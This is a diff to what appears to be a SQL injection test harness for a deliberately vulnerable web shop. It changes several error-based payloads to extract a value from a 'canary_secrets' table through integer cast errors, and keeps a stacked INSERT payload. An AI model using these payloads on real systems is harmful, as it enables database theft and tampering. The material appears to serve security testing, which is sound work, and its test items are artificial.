@@ -9,7 +9,7 @@ ExpectationKind = Literal[
     "extra_rows", "rows_contain", "error_text", "blind_pair", "side_effect_author"
 ]
 
-VERSION_CAST = "CAST((SELECT version()) AS int)"
+TOKEN_CAST = "CAST((SELECT token FROM canary_secrets) AS int)"
 INTEGER_SYNTAX_ERROR = "invalid input syntax for type integer"
 STACKED_COMMENT_INSERT = (
     "INSERT INTO comments (product_id, author, body) VALUES (1, '{author}', 'injected')"
@@ -57,7 +57,7 @@ REFERENCE_PAYLOADS: tuple[ReferencePayload, ...] = (
         "search",
         "error",
         "q",
-        f"' AND 1={VERSION_CAST} --",
+        f"' AND 1={TOKEN_CAST} --",
         Expectation("error_text", INTEGER_SYNTAX_ERROR),
     ),
     ReferencePayload(
@@ -78,7 +78,7 @@ REFERENCE_PAYLOADS: tuple[ReferencePayload, ...] = (
         "product",
         "error",
         "id",
-        f"1 AND 1={VERSION_CAST}",
+        f"1 AND 1={TOKEN_CAST}",
         Expectation("error_text", INTEGER_SYNTAX_ERROR),
     ),
     ReferencePayload(
@@ -91,7 +91,7 @@ REFERENCE_PAYLOADS: tuple[ReferencePayload, ...] = (
         "sort",
         "error",
         "order",
-        VERSION_CAST,
+        TOKEN_CAST,
         Expectation("error_text", INTEGER_SYNTAX_ERROR),
     ),
     ReferencePayload(
@@ -123,7 +123,7 @@ REFERENCE_PAYLOADS: tuple[ReferencePayload, ...] = (
         "cart_add",
         "error",
         "qty",
-        VERSION_CAST,
+        TOKEN_CAST,
         Expectation("error_text", INTEGER_SYNTAX_ERROR),
     ),
     ReferencePayload(
